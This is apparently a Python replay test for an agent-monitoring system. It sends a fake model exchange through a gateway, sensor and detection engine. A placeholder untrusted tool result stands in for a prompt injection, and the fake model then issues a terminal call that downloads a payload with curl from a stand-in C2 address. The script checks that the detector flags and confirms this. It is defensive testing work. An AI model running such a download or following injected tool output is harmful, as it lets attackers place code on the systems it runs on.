#!/usr/bin/env python3
"""Replay a placeholder model exchange through the gateway, sensor, and engine.

Uses a local fake upstream. No real model, hostname, or injection text.
The tool message is only a role=tool segment with a placeholder marker.
"""
import datetime
import json
import os
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from collector.semantic_gateway import Gateway, make_handler
from runtime.agents_config import load_agents
from runtime.engine import Store
from runtime.sensor import Adapter

ALLOWED = '192.0.2.10'
C2 = '198.51.100.20'
AGENTS = {
    'agents': [{
        'id': 'target-01',
        'gateway': {'bind': '127.0.0.1', 'port': 1, 'peerAllowlist': ['127.0.0.1/32']},
        'containers': [{'pattern': 'target-01-.*'}],
        'allowedNetworks': [{'cidr': '192.0.2.0/24', 'ports': [80, 443]}],
    }]
}
def _completion(tool_id, name, arguments):
    return json.dumps({
        'id': 'cmpl-placeholder',
        'choices': [{
            'index': 0,
            'message': {
                'role': 'assistant',
                'content': '',
                'tool_calls': [{
                    'id': tool_id,
                    'type': 'function',
                    'function': {'name': name, 'arguments': arguments},
                }],
            },
        }],
    }).encode()


LOOKUP_BODY = _completion('call_placeholder_lookup', 'lookup', '{}')
EXEC_BODY = _completion('call_placeholder_exec', 'terminal', json.dumps({'command': 'curl -o /opt/drill/payload http://%s/p' % C2}))


class Upstream(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    count = 0

    def do_POST(self):
        size = int(self.headers.get('Content-Length', '0'))
        if size:
            self.rfile.read(size)
        Upstream.count += 1
        body = LOOKUP_BODY if Upstream.count == 1 else EXEC_BODY
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def _serve(httpd):
    httpd.serve_forever()


def run(out_dir=None):
    Upstream.count = 0
    out = Path(out_dir or tempfile.mkdtemp(prefix='agentreins-replay-'))
    out.mkdir(parents=True, exist_ok=True)
    log = out / 'host.jsonl'
    upstream = ThreadingHTTPServer(('127.0.0.1', 0), Upstream)
    agents = load_agents(data=AGENTS)
    gateway = Gateway(upstream='http://127.0.0.1:%d/v1' % upstream.server_address[1], out_paths=[str(log)], agents=agents)
    front = ThreadingHTTPServer(('127.0.0.1', 0), make_handler(gateway))
    threads = [threading.Thread(target=_serve, args=(upstream,), daemon=True), threading.Thread(target=_serve, args=(front,), daemon=True)]
    for thread in threads:
        thread.start()
    try:
        first = {
            'model': 'placeholder',
            'messages': [{'role': 'user', 'content': 'PLACEHOLDER_STATUS'}],
        }
        _post(front, first)
        second = {
            'model': 'placeholder',
            'messages': [
                {'role': 'user', 'content': 'PLACEHOLDER_STATUS'},
                {'role': 'assistant', 'tool_calls': [{'id': 'call_placeholder_lookup', 'type': 'function', 'function': {'name': 'lookup', 'arguments': '{}'}}]},
                {'role': 'tool', 'tool_call_id': 'call_placeholder_lookup', 'content': 'PLACEHOLDER_UNTRUSTED_EXEC'},
            ],
        }
        status, body = _post(front, second)
        if body != EXEC_BODY:
            raise SystemExit('gateway rewrote the model response')
        if status != 200:
            raise SystemExit('unexpected status %s' % status)
        # The gateway forwards the response bytes first and writes its events right after,
        # so under load the log can trail the HTTP reply by a moment.
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            if log.exists() and any(
                    '"TOOL_CALL"' in line and 'terminal' in line
                    for line in log.read_text().splitlines()):
                break
            time.sleep(0.05)
        adapter = Adapter({'agents': AGENTS['agents'], 'containerPatterns': ['target-01-.*'], 'policies': {}})
        adapter.last_docker = time.time() + 3600
        adapter.containers = {'abc123abc123': 'target-01-sandbox'}
        events = []
        for line in log.read_text().splitlines():
            normalized = adapter.normalize(json.loads(line))
            if normalized:
                events.append(normalized)
        if not any(item.get('kind') == 'tool' and item.get('toolName') == 'terminal' for item in events):
            raise SystemExit('terminal tool call was not admitted')
        store = Store(out / 'runtime.sqlite')
        store.heartbeat('replay', {'layers': {'process': 'active'}, 'drop': 0})
        store.ingest('replay', events)
        semantic = [item for item in store.listing({})['items'] if item['rule'] == 'S03']
        if not semantic or semantic[0].get('phase') != 'semantic':
            raise SystemExit('semantic S03 missing: %s' % [item.get('rule') for item in store.listing({})['items']])
        host = {
            'operation': 'AUDIT_EXEC',
            'pid': 4242,
            'ppid': 1,
            'containerId': 'abc123abc123',
            'resource': "sh -c 'curl -o /opt/drill/payload http://%s/p'" % C2,
            'result': 'SUCCESS',
            'time': datetime.datetime.now().astimezone().isoformat(),
            'evidence': {'cwd': '/work'},
            'eventKey': 'replay-host-exec',
        }
        # The gateway writes timestamps a moment before this exec. Keep the host event after them.
        time.sleep(0.05)
        host['time'] = datetime.datetime.now().astimezone().isoformat()
        normalized_host = adapter.normalize(host)
        if not normalized_host or normalized_host.get('agentId') != 'target-01':
            raise SystemExit('host event was not bound to target-01')
        store.ingest('replay', [normalized_host])
        detail = store.detail(semantic[0]['id'])
        if detail.get('phase') != 'host_confirmed':
            raise SystemExit('host stage did not upgrade S03')
        links = detail['relation'].get('links') or []
        if len(links) < 2 or any(link.get('confidence') != 'correlated' for link in links[:2]):
            raise SystemExit('expected two correlated links')
        summary = {
            'ok': True,
            'alert': detail['id'],
            'phase': detail['phase'],
            'chainId': detail.get('chainId'),
            'agentId': detail.get('agentId'),
            'links': len(links),
            'responseUntouched': True,
        }
        (out / 'summary.json').write_text(json.dumps(summary, ensure_ascii=False, indent=2))
        return summary
    finally:
        front.shutdown()
        upstream.shutdown()


def _post(front, payload):
    raw = json.dumps(payload).encode()
    url = 'http://127.0.0.1:%d/a/target-01/v1/chat/completions' % front.server_address[1]
    request = urllib.request.Request(url, data=raw, headers={'Content-Type': 'application/json'})
    last = None
    for _ in range(20):
        try:
            with urllib.request.urlopen(request, timeout=10) as response:
                return response.status, response.read()
        except urllib.error.URLError as error:
            last = error
            time.sleep(0.05)
    raise last


if __name__ == '__main__':
    destination = sys.argv[1] if len(sys.argv) > 1 else None
    print(json.dumps(run(destination), ensure_ascii=False))
